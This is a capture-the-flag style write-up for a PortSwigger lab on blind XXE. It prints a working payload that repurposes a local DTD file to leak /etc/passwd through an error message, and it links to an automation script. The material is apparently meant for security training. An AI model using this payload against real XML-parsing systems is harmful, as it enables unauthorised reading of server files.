# Lab 9: Exploiting XXE to retrieve data by repurposing a local DTD
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, trigger an error message containing the contents of the /etc/passwd file.

You'll need to reference an existing DTD file on the server and redefine an entity from it.

[DTD File](https://github.com/darshannn10/PortSwiggers-Web-Sec-Academy/blob/main/XXE%20Injection/lab-09/enumerate-dtd.txt)

## Solution
> Manual Exploitation
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following parameter entity definition in between the XML declaration and the `stockCheck` element:
```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
This will import the Yelp DTD, then redefine the ISOamso entity, triggering an error message containing the contents of the /etc/passwd file.

> Automating the process
- [Script](https://github.com/darshannn10/PortSwiggers-Web-Sec-Academy/blob/main/XXE%20Injection/lab-09/lab-09-script.py)

## Video Solution
- [Sommer's Video](https://youtu.be/WNKBoYYNvQ8)
- [Seven Seas Security's Video](https://youtu.be/mAqY3OsVuE8)
